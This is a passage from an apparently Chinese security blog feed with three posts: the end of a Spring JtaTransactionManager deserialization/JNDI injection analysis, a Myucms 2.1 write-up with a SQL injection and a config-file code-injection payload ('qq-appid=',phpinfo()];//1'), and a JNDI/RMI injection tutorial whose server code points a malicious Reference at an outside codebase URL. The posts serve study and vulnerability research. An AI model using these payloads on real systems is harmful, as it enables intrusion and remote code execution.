UserTransaction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(</span><br><span class="line"><span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着跟进getJndiTemplate().lookup(userTransactionName, UserTransaction.class)</p><p>进一步跟进lookup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">Object located = ctx.lookup(name);</span><br><span class="line"><span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(</span><br><span class="line"><span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned null"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> located;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个lookup函数正是造成JNDI注入的lookup函数，在调用链中，我们可以通过userTransactionName属性值进行JNDI注入，而在client端，我们可以通过调用setUserTransactionName()函数去设置这个属性值，将其设置为我们的userTransactionName属性值，也就是我们设置的恶意RMI服务，进而造成JNDI注入。</p><p><strong>最根本的原因也就是在于org.springframework.transaction.jta.JtaTransactionManager类对readObject方法进行了重写，对JDNI注入中的lookup函数进行调用，而lookup的参数我们是可以控制的，所以会导致通过反序列化导致JNDI注入。</strong></p><p>PS：吐槽一下..在家学习效率可真太低了…一天的量感觉得分四五天…</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd</a></p><p><a href="https://segmentfault.com/a/1190000011291179" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011291179</a></p><p><a href="https://blog.csdn.net/Mr_Ming_/article/details/80556066" target="_blank" rel="noopener">https://blog.csdn.net/Mr_Ming_/article/details/80556066</a></p><p><a href="https://www.cnblogs.com/xdp-gacl/p/4249939.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/4249939.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;SpringMVC基础知识&quot;&gt;&lt;a href=&quot;#SpringMVC基础知识&quot; class=&quot;headerlink&quot; title=&quot;SpringMVC基础知识&quot;&gt;&lt;/a&gt;SpringMVC基础知识&lt;/h3&gt;&lt;h4 id=&quot;Spring介绍&quot;&gt;&lt;a href=&quot;#S
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Myucms 2.1 SQL注入加后台getshell</title>
    <link href="http://yoursite.com/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/"/>
    <id>http://yoursite.com/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/</id>
    <published>2020-02-29T08:11:18.000Z</published>
    <updated>2020-02-29T08:12:06.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>找了一个cms审了一下，有趣的是，这个cms的后台getshell挺明显的，本来想着能交个洞，搜了一下这个cms相关的洞…被交过了..而且还发了分析（就在前几天….</p><h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h3><p>这个sql注入挺明显的</p><p>位置挺多，随便拉一处来分析一下</p><p>/bbs/Comment/ding</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ding</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!session(<span class="string">'userid'</span>) || !session(<span class="string">'username'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请登录'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (session(<span class="string">'userid'</span>)!=<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'谁给你的权限？'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $id = input(<span class="string">'id'</span>);</span><br><span class="line">        $data[<span class="string">'settop'</span>] = <span class="number">1</span>;</span><br><span class="line">       $datas[<span class="string">'settop'</span>] = <span class="number">0</span>;</span><br><span class="line">        $da = Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">'id'</span>,$id)-&gt;value(<span class="string">'settop'</span>);</span><br><span class="line">      <span class="keyword">if</span> ($da == <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶失败'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($datas)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'取消置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'取消置顶失败'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">       &#125; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点单拉出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ($da == <span class="number">0</span>) &#123; </span><br><span class="line"><span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶失败'</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>id={$id}明显存在注入，打个断点，看一下具体执行的是什么语句，去闭合一下</p><p>发现他的闭合形式为 where (id=1),闭合后进行注入即可</p><p><img src="https://s2.ax1x.com/2020/02/29/3yAhJP.png" alt="3yAhJP.png"></p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>这个getshell挺明显的</p><p>admin/controller/Config/addqq</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addqq</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $path = <span class="string">'application/extra/qq.php'</span>;</span><br><span class="line">   $file = <span class="keyword">include</span> $path;      </span><br><span class="line">   $config = <span class="keyword">array</span>(</span><br><span class="line">     <span class="string">'qq-appid'</span> =&gt; input(<span class="string">'qq-appid'</span>),</span><br><span class="line">     <span class="string">'qq-appkey'</span> =&gt; input(<span class="string">'qq-appkey'</span>),</span><br><span class="line">     <span class="string">'qq-callback'</span> =&gt; input(<span class="string">'qq-callback'</span>),</span><br><span class="line">   );</span><br><span class="line">    $res = array_merge($file, $config);</span><br><span class="line">    $str = <span class="string">'&lt;?php return ['</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $str .= <span class="string">'\''</span> . $key . <span class="string">'\''</span> . <span class="string">'=&gt;'</span> . <span class="string">'\''</span> . $value . <span class="string">'\''</span> . <span class="string">','</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $str .= <span class="string">']; '</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_put_contents($path, $str)) &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'修改成功'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'修改失败'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post传下参数进行闭合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qq-appid&#x3D;&#39;,phpinfo()];&#x2F;&#x2F;1</span><br></pre></td></tr></table></figure><p>访问下主页：<br><a href="https://imgchr.com/i/3yVzb4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/29/3yVzb4.png" alt="3yVzb4.png"></a></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>看完了五本灵异类小说….终于对这种小说的故事线开始产生厌倦了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;找了一个cms审了一下，有趣的是，这个cms的后台getshell挺明显的，本来想着能交个洞，搜了一下这个cms相关的洞…被交过了..而且还
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java安全学习(二)--JNDI注入</title>
    <link href="http://yoursite.com/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C-JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C-JNDI%E6%B3%A8%E5%85%A5/</id>
    <published>2020-02-27T16:38:27.000Z</published>
    <updated>2020-02-27T16:39:06.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本概念介绍"><a href="#基本概念介绍" class="headerlink" title="基本概念介绍"></a>基本概念介绍</h3><p>本来不太想写这部分的…想了想…以后看的时候或许方便一些，还是写吧..</p><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>Java RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序<strong>编程接口</strong>。</p><p>RMI 使用 JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。</p><p>RMI的简单实现</p><p>Server端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义远程对象的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册远程对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException </span>&#123;</span><br><span class="line">        HelloServiceImpl helloService = <span class="keyword">new</span> HelloServiceImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">"rmi://127.0.0.1/hello"</span>,helloService);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException </span>&#123;</span><br><span class="line">        HelloService helloService = (HelloService) Naming.lookup(<span class="string">"rmi://127.0.0.1/hello"</span>);</span><br><span class="line">        System.out.println(helloService.say());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="RMI的调用机制"><a href="#RMI的调用机制" class="headerlink" title="RMI的调用机制"></a>RMI的调用机制</h5><p>RMI 采用stubs 和 skeletons 来进行远程对象(remote object)的通讯。stub 充当远程对象的客户端代理，有着和远程对象相同的远程接口，远程对象的调用实际是通过调用该对象的客户端代理对象stub来完成的。</p><h5 id="RMI调用过程"><a href="#RMI调用过程" class="headerlink" title="RMI调用过程"></a>RMI调用过程</h5><p><img src="https://s2.ax1x.com/2020/02/27/3weKWF.png" alt="3weKWF.png"></p><p>客户端调用stub(存根上的方法)，存根负责将要调用的远程对象方法的方法名以及其参数编组打包，并且通过Socket通信发送给Skeleton，Skeleton将客户端发送过来的数据包中的方法名以及编组的参数进行解析，并且在服务端将此方法执行，执行完毕后将返回值通过相反的路径返回给客户端Stub，Stub将返回结果解析后给客户程序。</p><h3 id="RMI-JNDI注入"><a href="#RMI-JNDI注入" class="headerlink" title="RMI+JNDI注入"></a>RMI+JNDI注入</h3><p>RMIClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"rmi://localhost:8080/refObj"</span>);</span><br><span class="line">            String data = <span class="string">"This is RMI Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8080</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://139.224.236.99/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:8080/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行触发</p><p><img src="https://s2.ax1x.com/2020/02/27/3wzsWq.png" alt="3wzsWq.png"></p><p>调用链分析</p><p><img src="https://s2.ax1x.com/2020/02/27/30lnZ4.png" alt="30lnZ4.png"></p><p>InitialContext.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GenericURLContext.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RegistryContext.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RegistryContext.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//如果是Reference对象的话,将进行一次RMI服务器的链接,获取远程class文件</span></span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NamingManager.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String f = ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//跟进            factory = getObjectFactoryFromReference(ref, f);</span></span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                